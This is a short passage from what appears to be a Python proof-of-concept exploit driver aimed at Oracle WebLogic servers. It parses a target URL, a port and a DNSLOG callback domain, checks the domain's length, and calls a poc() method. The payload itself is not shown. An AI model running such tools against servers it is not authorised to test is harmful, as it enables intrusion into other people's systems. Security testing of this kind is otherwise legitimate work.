...
if __name__ =="__main__":
    ...
    parser.add_argument('-d','--dns',default=None,help='DNSLOG请求地址，地址必须是s5x9m3.dnslog.cn这种类型，长度保持一致',type=str)
    args = parser.parse_args()

    if len(args.dns) != len("kumiwf.dnslog.cn"):
        print("DNSLOG 长度必须是%s" % len("kumiwf.dnslog.cn"))
        exit()

    if args.url and args.dns:
        try:
            target = WebLogic(args.url, args.port, args.dns)
            target.poc()
        except Exception as e:
